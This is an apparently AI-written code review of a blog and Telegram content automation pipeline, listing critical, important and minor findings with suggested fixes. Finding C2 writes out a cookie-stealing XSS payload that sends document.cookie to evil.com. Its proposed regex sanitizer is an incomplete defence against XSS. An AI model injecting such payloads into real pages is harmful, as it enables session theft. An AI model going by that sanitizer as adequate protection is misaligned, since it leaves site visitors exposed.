# Automation Pipeline Code Quality Review

**Date:** 2026-03-22
**Type:** automation-review
**Reviewer:** code-review-expert agent
**Scope:** Complete automation pipeline (pipeline.py, all clients, publisher, verifier)
**Phase Context:** Post-Phase 3 (AI Automation) and Phase 4 (Blog Migration) verification

---

## Executive Summary

The pipeline is a well-structured two-stage content automation system with clear separation of concerns. Overall architecture is sound for a 3-week sprint. However, there are **critical issues affecting production reliability**: no deduplication logic (already causing duplicate posts in live data), XSS vector in AI-generated HTML, no file locking on shared JSON state, and fragile LLM output parsing with zero retry logic. The pipeline is **not yet reliable enough for unattended daily automation**.

---

## Critical Findings

### [C1] No Duplicate Post Guard - Already Causing Data Corruption

**Severity:** RED - Critical
**File(s):** `automation/blog_publisher.py` lines 122-132, `website/data/index.json`
**Impact:** Pipeline creates new post with incrementing suffix (`-1`, `--2`) on every run, even for same content. Live data shows 5 near-identical "zero-registered-slaughterhouses" posts from same day.

**Current Code:**
```python
slug = _slugify(post_data['title'])
# Check if slug exists
for entry in index:
    if entry['id'] == slug:
        slug = f'{slug}-1'  # Silent increment
        break
```

This guards against duplicate *slugs* but not duplicate *content*. Running `--publish` twice creates `-1` variant.

**Fix:** Add idempotency check:
```python
def publish_to_website(post_data: dict) -> tuple[str, str]:
    index = _load_index()
    slug = _slugify(post_data['title'])

    # Idempotency: if exact slug exists, return it instead of duplicating
    for entry in index:
        if entry['id'] == slug:
            post_url = f'{WEBSITE_URL}/post.html?id={slug}'
            log.warning(f'Post "{slug}" already published -- skipping duplicate.')
            return slug, post_url

    # ...rest of function...
```

---

### [C2] XSS Vector - AI-Generated HTML Rendered Without Sanitization

**Severity:** RED - Critical
**File(s):** `automation/blog_publisher.py` (all post writes), `website/post.html` line 134
**Impact:** AI-generated `body_html` inserted into DOM without sanitization. Malicious content in research inputs or data file tampering executes in visitor browsers.

**Scenarios:**
1. **Prompt injection:** Research input contains `<script>document.location='https://evil.com/?c='+document.cookie</script>`
2. **Data tampering:** Anyone with write access to `website/data/posts/` can inject JavaScript

**Fix:** Sanitize on Python side before writing:
```python
import re

def _sanitize_html(html: str) -> str:
    """Strip script tags and event handlers from AI-generated HTML."""
    html = re.sub(r'<script[^>]*>.*?</script>', '', html, flags=re.DOTALL | re.IGNORECASE)
    html = re.sub(r'\s+on\w+\s*=\s*["\'][^"\']*["\']', '', html, flags=re.IGNORECASE)
    return html

# Apply before writing post file
post_data['body_html'] = _sanitize_html(post_data['body_html'])
```

---

### [C3] No Retry Logic on LLM JSON Parsing - Pipeline Fails on First Error

**Severity:** RED - Critical
**File(s):** `automation/claude_client.py` lines 61-67
**Impact:** If Claude returns malformed JSON, `json.loads` raises `JSONDecodeError` and pipeline crashes. No retry. For daily automation, this is single point of failure.

**Current Code:**
```python
raw = response.content[0].text.strip()
raw = re.sub(r'^```(?:json)?\s*', '', raw)
raw = re.sub(r'\s*```$', '', raw)
post = json.loads(raw)  # Crashes if malformed
```

**Additional Risk:** `max_tokens=4096` can truncate long articles mid-JSON, causing guaranteed parse failure.

**Fix:** Add retry loop and increase token budget:
```python
_MAX_RETRIES = 2

def synthesise_post(research_text: str, angle: str) -> dict:
    for attempt in range(_MAX_RETRIES + 1):
        response = _client.messages.create(
            model=_MODEL,
            max_tokens=8192,  # Double to avoid truncation
            system=_SYSTEM_PROMPT,
            messages=[{"role": "user", "content": prompt}],
        )
        raw = response.content[0].text.strip()
        raw = re.sub(r'^```(?:json)?\s*', '', raw)
        raw = re.sub(r'\s*```$', '', raw)

        try:
            post = json.loads(raw)
            break
        except json.JSONDecodeError as e:
            if attempt == _MAX_RETRIES:
                raise ValueError(f'Claude returned invalid JSON after {_MAX_RETRIES + 1} attempts: {e}') from e
            log.warning(f'JSON parse failed (attempt {attempt + 1}), retrying: {e}')

    # ...rest of function
```

---

## Important Findings

### [I1] No File Locking on index.json - Concurrent Write Corruption Risk

**Severity:** YELLOW - Important
**File(s):** `automation/blog_publisher.py` lines 122-167
**Impact:** Read-modify-write pattern on index.json. If two processes run `--publish` simultaneously, second write overwrites first, silently dropping one post.

**Fix:** Use file locking:
```python
from filelock import FileLock

_INDEX_LOCK = FileLock(str(INDEX_FILE) + '.lock', timeout=10)

def publish_to_website(post_data: dict) -> tuple[str, str]:
    with _INDEX_LOCK:
        index = _load_index()
        # ... rest of function ...
        INDEX_FILE.write_text(json.dumps(index, indent=2, ensure_ascii=False), encoding='utf-8')
```

---

### [I2] Stale References to posts.json After Phase 4 Migration

**Severity:** YELLOW - Important
**File(s):** `automation/pipeline.py` lines 11, 162, 169, 180
**Impact:** Four references to old `posts.json` remain in comments and log messages. Misleads operators during debugging.

**Examples:**
- Line 11: `Load today's preview JSON -> website/data/posts.json -> Telegram`
- Line 162: `log.info('Copy website/data/posts.json to your website folder...')`

**Fix:** Update all references to mention `index.json` and `posts/{slug}.json`.

---

### [I3] gemini_client.py Is Broken Dead Code

**Severity:** YELLOW - Important
**File(s):** `automation/gemini_client.py` line 4
**Impact:** Imports `GEMINI_API_KEY` from config but config.py doesn't define it. ImportError if module is ever imported.

**Fix:** Delete `gemini_client.py` entirely (project migrated to Claude via Bedrock) or add `GEMINI_API_KEY` to config if keeping as fallback.

---

### [I4] publish_to_website Hardcodes date.today() Instead of Using Post Date

**Severity:** YELLOW - Important
**File(s):** `automation/blog_publisher.py` line 131
**Impact:** When publishing backlogged posts (e.g., `pipeline.py --publish 2026-03-20`), post file written with today's date (2026-03-22) not preview date.

**Fix:** Pass target date through:
```python
def publish_to_website(post_data: dict, publish_date: date = None) -> tuple[str, str]:
    post_date = (publish_date or date.today()).isoformat()
```

And in pipeline.py:
```python
slug, post_url = blog_publisher.publish_to_website(post_data, publish_date=target)
```

---

### [I5] No Configuration Validation at Startup

**Severity:** YELLOW - Important
**File(s):** `automation/config.py`
**Impact:** Wrong AWS_PROFILE or AWS_DEFAULT_REGION surfaces as cryptic Bedrock API failure deep in claude_client.py rather than clear startup message.

**Fix:** Add validation function:
```python
def validate():
    errors = []
    if not BEDROCK_MODEL_ID.startswith('us.'):
        errors.append(f'BEDROCK_MODEL_ID must use us. prefix (got: {BEDROCK_MODEL_ID})')
    if TELEGRAM_ENABLED and not TELEGRAM_BOT_TOKEN:
        errors.append('TELEGRAM_BOT_TOKEN required when TELEGRAM_ENABLED=True')
    if errors:
        raise RuntimeError('Config validation failed:\n' + '\n'.join(errors))
```

Call at pipeline startup.

---

### [I6] env.example References AWS_REGION but config.py Reads AWS_DEFAULT_REGION

**Severity:** YELLOW - Important
**File(s):** `automation/env.example` line 8, `automation/config.py` line 10
**Impact:** Naming mismatch confuses developers following template.

**env.example says:**
```
AWS_REGION=us-east-1
```

**config.py reads:**
```python
AWS_REGION = os.getenv('AWS_DEFAULT_REGION') or os.getenv('AWS_REGION', 'us-east-1')
```

**Fix:** Update `env.example` to `AWS_DEFAULT_REGION=us-east-1` to match actual .env file.

---

### [I7] Telegram send_message Sends HTML Without Escaping

**Severity:** YELLOW - Important
**File(s):** `automation/telegram_client.py` lines 13-22
**Impact:** Message sent with `parse_mode: 'HTML'`. Unescaped `<`, `>`, or `&` in AI-generated text causes Telegram HTML parser to reject message with 400 error.

**Fix:** Escape message or use Markdown:
```python
import html as html_module

def send_message(text: str) -> dict:
    # Telegram HTML mode requires escaping < > &
    safe_text = html_module.escape(text)
    # Allow specific tags Telegram supports
    for tag in ('b', 'i', 'strong', 'em', 'a', 'code', 'pre'):
        safe_text = safe_text.replace(f'&lt;{tag}&gt;', f'<{tag}>')
        safe_text = safe_text.replace(f'&lt;/{tag}&gt;', f'</{tag}>')
    # ... send safe_text
```

---

## Suggestions

### [S1] Post Filename Lacks Date Prefix

**Severity:** GREEN - Suggestion
**File(s):** `automation/blog_publisher.py` line 132
**Benefit:** Filesystem clarity - can't tell when post was published by looking at directory listing.

**Current:** `{slug}.json`
**Suggested:** `{date}-{slug}.json` (e.g., `2026-03-22-hidden-rabies-risk.json`)

Note: Docstring on line 115 mentions `{date}-{slug}.json` but implementation omits date.

---

### [S2] pipeline.py Uses sys.stdout.buffer.write for Dry-Run Output

**Severity:** GREEN - Suggestion
**File(s):** `automation/pipeline.py` line 138
**Benefit:** Simpler code - `print(json.dumps(...))` would handle encoding via PYTHONUTF8.

---

### [S3] content_verifier.py - No Validation of body_html Structure

**Severity:** GREEN - Suggestion
**Benefit:** Catch cases where Claude returns plain text instead of HTML.

**Current:** Verifier checks for 95% stat and Change.org link but doesn't validate HTML structure.
**Suggested:** Add minimal check for `<p>` tags or valid HTML.

---

### [S4] run.bat - No Error Handling or Logging

**Severity:** GREEN - Suggestion
**File(s):** `automation/run.bat`
**Benefit:** Task Scheduler shows "completed" even if pipeline fails. No error record.

**Fix:**
```batch
@echo off
cd /d "%~dp0"
python pipeline.py >> logs\scheduler.log 2>&1
if errorlevel 1 (
    echo Pipeline failed at %date% %time% >> logs\scheduler-errors.log
)
```

---

### [S5] No Tests Exist for Automation Code

**Severity:** GREEN - Suggestion
**Benefit:** Catch regressions early, especially for slug generation, content verification, JSON parsing.

**Suggested Tests:**
- `_slugify` function
- `content_verifier.verify` and `auto_fix`
- Mock test for `synthesise_post` JSON parsing

---

### [S6] requirements.txt Does Not Pin google-generativeai

**Severity:** GREEN - Suggestion
**Benefit:** Either add dependency or delete dead gemini_client.py module.

---

## Praise

### [P1] Two-Stage Generate/Publish Architecture

The separation between Stage 1 (generate + preview) and Stage 2 (manual review + publish) is excellent design for AI-generated content. Prevents hallucinated or off-brand content from going live without human review.

---

### [P2] Content Verifier with Auto-Fix

The `verify` + `auto_fix` pattern ensures 95% stat and Change.org link are always present, automatically repairing common Claude omissions rather than failing pipeline. Pragmatic engineering.

---

### [P3] Clean Separation of Concerns

`config.py`, `claude_client.py`, `content_verifier.py`, `blog_publisher.py`, `telegram_client.py`, and `facebook_client.py` are each focused on one responsibility. Dependency graph is simple and linear.

---

### [P4] Good Use of pathlib Throughout

Consistent `Path` usage instead of string concatenation for file paths is clean and cross-platform.

---

### [P5] Rotating Topic Templates

`_TOPIC_TEMPLATES` with day-of-year cycling ensures variety even when no manual research input provided. Coverage across health, cruelty, regulation, support, and Lucky's story is well-balanced.

---

### [P6] Split-File Storage Migration Well-Executed

New architecture (lightweight `index.json` + individual post files) correctly solves scalability problem. Frontend consumption in `blog.html` and `post.html` properly aligned with new structure.

---

## Verdict

**Status:** ⚠️ **Request Changes**

Pipeline has solid architecture but is **not production-ready** for unattended daily automation. Three critical issues must be addressed:

1. Add deduplication (C1) - already causing real data problems
2. Add HTML sanitization (C2) - XSS risk from AI-generated content
3. Add retry logic and increase max_tokens (C3) - single-request failures crash pipeline

Important issues (file locking, stale references, config validation, Telegram escaping) should follow before onboarding team members who need accurate error feedback.

---

## Action Items

- [ ] **CRITICAL:** Add deduplication to blog_publisher.py
- [ ] **CRITICAL:** Sanitize body_html before writing post files
- [ ] **CRITICAL:** Add retry logic to claude_client.py + increase max_tokens to 8192
- [ ] Add file locking for index.json writes
- [ ] Update all stale posts.json references to split storage
- [ ] Delete gemini_client.py dead code
- [ ] Fix publish_to_website date handling
- [ ] Add config validation at startup
- [ ] Fix env.example AWS_REGION mismatch
- [ ] Escape Telegram HTML messages
- [ ] Add date prefix to post filenames
- [ ] Write tests for core functions
- [ ] Track remaining issues in Phase 5 plans

---

## Reviewed Files

- `automation/pipeline.py`
- `automation/claude_client.py`
- `automation/blog_publisher.py`
- `automation/content_verifier.py`
- `automation/config.py`
- `automation/telegram_client.py`
- `automation/facebook_client.py`
- `automation/gemini_client.py`
- `automation/migrate_blog_storage.py`
- `website/data/index.json`
- `website/blog.html`
- `website/post.html`
